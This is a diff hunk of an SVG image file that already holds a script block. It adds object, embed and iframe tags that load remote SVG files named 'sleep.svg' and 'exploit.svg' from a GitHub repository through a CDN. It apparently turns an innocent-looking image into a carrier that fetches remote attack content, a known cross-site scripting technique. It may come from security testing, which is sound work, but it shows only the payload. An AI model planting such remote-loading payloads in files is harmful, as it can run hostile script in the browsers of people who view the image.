@@ -6,3 +6,7 @@
   </script>
   <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
 </svg>
+
+<object data="https://cdn.jsdelivr.net/gh/TheMonkeyPrince/RandomRepo@master/sleep.svg" type="image/svg+xml"> </object>
+<embed src="https://cdn.jsdelivr.net/gh/TheMonkeyPrince/RandomRepo@master/exploit.svg">
+<iframe src="https://cdn.jsdelivr.net/gh/TheMonkeyPrince/RandomRepo@master/exploit.svg">
